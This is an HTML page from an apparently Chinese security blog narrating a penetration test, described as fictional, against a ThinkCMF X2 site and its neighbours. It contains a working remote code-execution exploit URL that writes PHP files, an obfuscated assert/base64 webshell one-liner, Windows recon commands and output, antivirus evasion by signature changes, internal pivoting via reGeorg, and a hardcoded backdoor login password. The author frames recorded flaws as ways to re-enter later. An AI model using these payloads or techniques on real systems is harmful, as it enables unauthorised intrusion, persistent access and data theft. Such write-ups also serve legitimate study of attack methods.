@@ -1,0 +1,150 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>记一次拟真环境的模拟渗透测试 · Chen's Blog</title> <meta name="description" content="记一次拟真环境的模拟渗透测试"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2019-08-19/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">Author[#]Vulkey_Chen</h1> <div class="divider"></div> <center><a href="/about">关于我</a> | <a href="/links">友情链接</a> | <a href="/getavname">Windows进程对比杀软信息</a></center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">记一次拟真环境的模拟渗透测试</h1> <time class="code">August 19, 2019</time> </div> <div class="divider"></div> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&auto=1&id=1331977945&height=66"></iframe> <h1 id="记一次拟真环境的模拟渗透测试">记一次拟真环境的模拟渗透测试</h1> <p>注：<strong>此文为虚构，如有雷同实属巧合。</strong></p> <p>本文仅用于记录，Web打点，内网横向一些很常规化的东西。</p> <p>目标站：http://vuln_attack/</p> <p>任务：权限、横向</p> <h2 id="前信息收集踩点">前·信息收集（踩点）</h2> <ul> <li>端口开放 <ul> <li>80 - HTTP</li> <li>3389 - RDP</li> </ul> </li> <li>指纹 <ul> <li>ThinkCMF</li> <li>PHP/5.6.36</li> <li>IIS</li> </ul> </li> <li>目录探测(只探测状态码为301、302、200) <ul> <li>http://vuln_attack:80/admin (后台) <ul> <li>http://vuln_attack:80/admin/themes/</li> </ul> </li> <li>http://vuln_attack:80/api</li> <li>http://vuln_attack:80/aspnet_client (IIS结构)</li> <li>http://vuln_attack:80/data <ul> <li>http://vuln_attack:80/data/logs/</li> <li>http://vuln_attack:80/data/upload/</li> <li>http://vuln_attack:80/data/backup/</li> <li>http://vuln_attack:80/data/conf/ <ul> <li>/index.html</li> <li>/config.php</li> <li>/db.php</li> </ul> </li> </ul> </li> <li>http://vuln_attack:80/plugins</li> <li>http://vuln_attack:80/public</li> <li>http://vuln_attack:80/test (PHPINFO) <ul> <li>/log.txt</li> <li>/0.php</li> <li>/1.php</li> <li>/00.php</li> <li>/01.php</li> <li>/02.php</li> <li>/03.php</li> <li>/04.php</li> <li>/05.php</li> </ul> </li> <li>http://vuln_attack:80/themes</li> <li>http://vuln_attack:80/update</li> <li>http://vuln_attack:80/application</li> <li>http://vuln_attack:80/cust</li> <li>http://vuln_attack:80/re (500)</li> <li>http://vuln_attack:80/rp (500)</li> <li>http://vuln_attack:80/www.rar (网站备份源码)</li> <li>http://vuln_attack:80/index.php</li> <li>http://vuln_attack:80/license.txt</li> </ul> </li> <li>其他收集 <strong>通过下载<code class="language-plaintext highlighter-rouge">www.rar</code>文件获得网站备份源码获得的信息</strong> <ul> <li>寻找密码 <ul> <li><code class="language-plaintext highlighter-rouge">grep -i -r "pwd' =&gt; '" ./</code> 结果： <img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/0.jpg" alt="" /> <ul> <li>sxxxx3</li> <li>rxxxx3</li> </ul> </li> <li><code class="language-plaintext highlighter-rouge">grep -i -r "pass' =&gt; '" ./</code> 结果：无</li> <li><code class="language-plaintext highlighter-rouge">grep -i -r "password' =&gt; '" ./</code> 结果：无</li> </ul> </li> </ul> </li> </ul> <h2 id="中渗透打入">中·渗透打入</h2> <h3 id="thinkcmfx2-0day-get-webshell">ThinkCMFx2 0day Get Webshell</h3> <ul> <li> <p>已知该系统业务为ThinkCMF，且通过泄露的源码文件中得知版本为x2.0.0</p> <p><code class="language-plaintext highlighter-rouge">define("SIMPLEWIND_CMF_VERSION", 'X2.0.0');</code></p> <p>使用ThinkCMF的GetWebshell的Exp打一波（结果：未成功）</p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/1.png" alt="" /></p> <p>访问<code class="language-plaintext highlighter-rouge">r.php</code>是404的：</p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/2.jpg" alt="" /></p> <p>但在本地搭建测试的时候是可以写入的（<strong>Exploit</strong>:<code class="language-plaintext highlighter-rouge">/index.php?xxx=file_put_contents('r.php','&lt;?php%20eval($_REQUEST[r]);')</code>）：</p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/3.jpg" alt="" /></p> <p><strong>思考：</strong> a.是否可以写入但被删除 b.exp是否被拦截</p> <ul> <li> <p>修改exp为<code class="language-plaintext highlighter-rouge">/index.php?xxx=file_put_contents('1.txt','123')</code>：写入<code class="language-plaintext highlighter-rouge">1.txt</code>内容为<code class="language-plaintext highlighter-rouge">123</code></p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/4.jpg" alt="" /></p> <p><strong>结果：</strong> 上传成功访问存在，可利用exp写文件</p> </li> <li> <p>修改exp为<code class="language-plaintext highlighter-rouge">/index.php?xxx=file_put_contents('1.php','123')</code>：写入<code class="language-plaintext highlighter-rouge">1.php</code>内容为<code class="language-plaintext highlighter-rouge">123</code></p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/5.jpg" alt="" /></p> <p><strong>结果：</strong> 上传成功访问存在，可利用exp写PHP文件</p> </li> <li> <p>修改exp为<code class="language-plaintext highlighter-rouge">/index.php?xxx=file_put_contents('1.php','&lt;?php+$a="assert";$a(base64_decode(@$_REQUEST[k]));?&gt;')</code></p> <p>简单的写了一个绕过的PHP一句话脚本木马：</p> <p><code class="language-plaintext highlighter-rouge">&lt;?php $a="assert";$a(base64_decode(@$_REQUEST[k]));?&gt;</code></p> <p><strong>结果：</strong> 上传成功访问存在，Webshell拿下</p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/6.jpg" alt="" /></p> </li> </ul> </li> </ul> <p><strong>接下来我们进入后深入阶段。</strong></p> <h2 id="后深入">后·深入</h2> <h3 id="主机信息收集">主机信息收集</h3> <h4 id="域环境判断">域环境判断</h4> <ul> <li>net user /domain</li> <li><code class="language-plaintext highlighter-rouge">查看域内的用户（此处用来判断是否有域环境）</code></li> <li>结果：此处非域环境</li> </ul><pre><code class="language-cmd">这项请求将在域 WORKGROUP 的域控制器处理。
+
+发生系统错误 1355。
+
+指定的域不存在，或无法联系。
+</code></pre><h4 id="信息收集">信息收集</h4> <ul> <li>whoami /all</li> <li><code class="language-plaintext highlighter-rouge">查看当前用户</code></li> </ul><pre><code class="language-cmd">用户信息
+----------------
+
+用户名            SID     
+================= ========
+nt authority\iusr S-1-5-17
+
+
+组信息
+-----------------
+
+组名                                 类型   SID          属性                          
+==================================== ====== ============ ==============================
+Mandatory Label\High Mandatory Level 标签   S-1-16-12288                               
+Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
+BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
+NT AUTHORITY\SERVICE                 已知组 S-1-5-6      只用于拒绝的组                
+控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
+NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
+NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
+LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
+
+
+特权信息
+----------------------
+
+特权名                  描述                 状态  
+======================= ==================== ======
+SeChangeNotifyPrivilege 绕过遍历检查         已启用
+SeImpersonatePrivilege  身份验证后模拟客户端 已启用
+SeCreateGlobalPrivilege 创建全局对象         已启用
+</code></pre><ul> <li>net user</li> <li><code class="language-plaintext highlighter-rouge">查看用户</code></li> </ul><pre><code class="language-cmd">\\ 的用户帐户
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    MYSQL_SF_xxxx          
+命令运行完毕，但发生一个或多个错误。
+</code></pre><ul> <li>net localgroup administrators</li> <li><code class="language-plaintext highlighter-rouge">查看本地管理员用户</code></li> </ul><pre><code class="language-cmd">别名     administrators
+注释     管理员对计算机/域有不受限制的完全访问权
+
+成员
+
+-------------------------------------------------------------------------------
+Administrator
+命令成功完成。
+</code></pre><ul> <li>ipconfig /all</li> <li><code class="language-plaintext highlighter-rouge">查看本机IP、DNS信息、DHCP服务器信息等</code></li> <li>结果：此处查看发现并不是内网IP段</li> </ul><pre><code class="language-cmd">Windows IP 配置
+
+   主机名  . . . . . . . . . . . . . : WIN-xxx
+   主 DNS 后缀 . . . . . . . . . . . : 
+   节点类型  . . . . . . . . . . . . : 混合
+   IP 路由已启用 . . . . . . . . . . : 否
+   WINS 代理已启用 . . . . . . . . . : 否
+
+以太网适配器 xxxx.133:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Microsoft Hyper-V 网络适配器
+   物理地址. . . . . . . . . . . . . : xx-xx-xx-xx-xx-xx
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+   本地链接 IPv6 地址. . . . . . . . : xxx%11(首选) 
+   IPv4 地址 . . . . . . . . . . . . : xxxx.133(首选) 
+   子网掩码  . . . . . . . . . . . . : 255.255.255.192
+   默认网关. . . . . . . . . . . . . : xxxx.190
+   DHCPv6 IAID . . . . . . . . . . . : 234886493
+   DHCPv6 客户端 DUID  . . . . . . . : xxxx
+   DNS 服务器  . . . . . . . . . . . : xxxx.151.161
+                                       xxxx.156.66
+   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+...
+</code></pre><ul> <li>arp -a</li> <li><code class="language-plaintext highlighter-rouge">查看arp的缓冲记录（获取存活的IP地址）</code></li> </ul> <blockquote> <p>ARP缓存是个用来储存IP地址和MAC地址的缓冲区，其本质就是一个IP地址–&gt;MAC地址的对应表，表中每一个条目分别记录了网络上其他主机的IP地址和对应的MAC地址。每一个以太网或令牌环网络适配器都有自己单独的表。</p> </blockquote><pre><code class="language-cmd">接口: xxxx.133 --- 0xb
+  Internet 地址         物理地址              类型
+  xxxx.129          xx-xx-xx-xx-xx-xx     动态        
+  xxxx.135          xx-xx-xx-xx-xx-xx     动态        
+  xxxx.149          xx-xx-xx-xx-xx-xx     动态        
+  xxxx.150          xx-xx-xx-xx-xx-xx     动态        
+  xxxx.168          xx-xx-xx-xx-xx-xx     动态        
+  xxxx.190          xx-xx-xx-xx-xx-xx     动态        
+  xxxx.191          xx-xx-xx-xx-xx-xx     静态  
+...             
+</code></pre><ul> <li>tasklist</li> <li><code class="language-plaintext highlighter-rouge">查看系统任务进程</code></li> <li>结果：发现存在SafeDog安全防护软件</li> </ul><pre><code class="language-cmd">tasklist
+
+映像名称                       PID 会话名              会话#       内存使用 
+========================= ======== ================ =========== ============
+System Idle Process              0                            0         24 K
+System                           4                            0      5,184 K
+smss.exe                       288                            0      1,156 K
+mysqld.exe                    1396                            0    839,672 K
+SafeDogGuardHelper.exe        6476                            2     18,220 K
+SafeDogGuardHelper.exe        9536                            2     11,748 K
+...
+</code></pre><h3 id="主机提权">主机提权</h3> <ul> <li>systeminfo</li> <li><code class="language-plaintext highlighter-rouge">查看系统信息</code></li> </ul><pre><code class="language-cmd">主机名:           WIN-xxxx
+OS 名称:          Microsoft Windows Server 2008 R2 Datacenter 
+OS 版本:          6.1.7601 Service Pack 1 Build 7601
+OS 制造商:        Microsoft Corporation
+OS 配置:          独立服务器
+OS 构件类型:      Multiprocessor Free
+注册的所有人:     Windows 用户
+注册的组织:       
+产品 ID:          xxxx
+初始安装日期:     2018/5/9, 22:50:59
+系统启动时间:     2018/8/31, 9:38:26
+系统制造商:       Microsoft Corporation
+系统型号:         Virtual Machine
+系统类型:         x64-based PC
+处理器:           安装了 1 个处理器。
+                  [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2500 Mhz
+BIOS 版本:        American Megatrends Inc. 090006 , 2012/5/23
+Windows 目录:     C:\Windows
+系统目录:         C:\Windows\system32
+启动设备:         \Device\HarddiskVolume1
+系统区域设置:     zh-cn;中文(中国)
+输入法区域设置:   zh-cn;中文(中国)
+时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
+物理内存总量:     8,192 MB
+可用的物理内存:   4,779 MB
+虚拟内存: 最大值: 16,381 MB
+虚拟内存: 可用:   12,977 MB
+虚拟内存: 使用中: 3,404 MB
+页面文件位置:     C:\pagefile.sys
+域:               WORKGROUP
+登录服务器:       暂缺
+修补程序:         暂缺
+网卡:             安装了 1 个 NIC。
+                  [01]: Microsoft Hyper-V 网络适配器
+                      连接名:      xxxx.133
+                      启用 DHCP:   否
+                      IP 地址
+                        [01]: xxxx.133
+                        [02]: xxxxx
+</code></pre><p>根据获取的系统信息判断可使用的提权Exploit，尝试上传提权Exploit，运行即被杀：</p><pre><code class="language-cmd">C:\APP\www\&gt;exp.exe
+'exp.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+</code></pre><p>通过之前的信息收集知道存在”安全狗”防护软件，发现被杀的Exp都存放在<code class="language-plaintext highlighter-rouge">C:\SafeDogRecycle\</code>目录下，文件被随机命名：</p><pre><code class="language-cmd"> C:\SafeDogRecycle 的目录
+    &lt;DIR&gt;          .
+    &lt;DIR&gt;          ..
+    02ebe5a9-1abf-4f85-839c-2b74deebb02f
+    ...
+</code></pre><p>后经测试发现将Exploit存在<code class="language-plaintext highlighter-rouge">C:\SafeDogRecycle\</code>目录部分行为并不会被杀，但敏感行为还是会被Kill掉。</p> <p>本地搭建服务器安全狗，利用修改特征码的方式进行免杀，但即使Bypass了安全狗，Exploit也无法执行，补丁已经打上了。</p> <p>利用收集到的口令进行字典的整合，猜测管理员密码也无解～</p> <p><strong>结果:</strong> 提权失败</p> <h3 id="横向">横向</h3> <p>地址：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxxx.129
+xxxx.135
+xxxx.149
+xxxx.150
+xxxx.168
+xxxx.190
+xxxx.191
+</code></pre></div></div> <p>端口扫描仅仅发现<code class="language-plaintext highlighter-rouge">xxxx.129</code>、 <code class="language-plaintext highlighter-rouge">xxxx.135</code>存在着服务</p> <h4 id="xxxx135">xxxx.135</h4> <p>访问该站点发现其为IIS8.5</p> <p>经探测并无什么有价值性的东西。</p> <h4 id="xxxx129">xxxx.129</h4> <p><em>访问该站点发现到了其他的一个站点，这个站点也为ThinkCMFX2，使用上文所述方法拿下WebShell。</em></p> <p><strong>环境</strong>: Linux</p> <p><strong>内核</strong>: <code class="language-plaintext highlighter-rouge">Linux izbp15gn5pyr1s5tlc45h0z 3.10.0-693.2.2.el7.x86_64</code></p> <p><strong>权限</strong>: www</p> <p><strong>网络环境</strong>: 内网</p> <p>经过测试发现本机用户权限真的很低，<code class="language-plaintext highlighter-rouge">gcc</code>之类的操作都没权限进行，尝试使用suid提权也无果，就连反弹个shell都提示<code class="language-plaintext highlighter-rouge">bash: /bin/sh: Permission denied</code>，醉了～</p> <p>放弃提权，reGeorg+Proxifier 代理进内网撸一波～</p> <p>结果：发现一个内网主机存活，ThinkCMFX2又撸下来了</p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/7.jpg" alt="" /></p> <h2 id="终其他缺陷">终·其他缺陷</h2> <p>对发现的其他安全缺陷做记录是一件很有必要的事情，为防止单个漏洞被修复，也为了下次更好的“进来”。</p> <h3 id="前台登录万能密码后门">前台登录万能密码后门</h3> <p>文件<code class="language-plaintext highlighter-rouge">/application/Cust/Controller/LoginController.class.php</code>第214行：</p> <p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-08-19/8.jpg" alt="" /></p> <p>在做登录验证的时候有一个条件：<code class="language-plaintext highlighter-rouge">$password=='xxxx@123'</code>，前台登录只需要满足密码等于<code class="language-plaintext highlighter-rouge">xxxx@123</code>即可实现任意用户的登录。</p> <h2 id="总结">总结</h2> <p>文章比较常规，总结一句话就是：渗透的前期信息打点很重要，信息的收集要做到细致，就像你看某小电影一样每个高潮的细节都不会放过～</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2019-08-20/1" title="NEXT: TRICK: Linux Auditd审计工具">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">Index</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2019-08-16/1" title="PREV: RGPerson - 随机身份生成脚本">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt;Copyright &copy; Vulkey_Chen's Blog (GH0ST.CN) 2016-2020</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
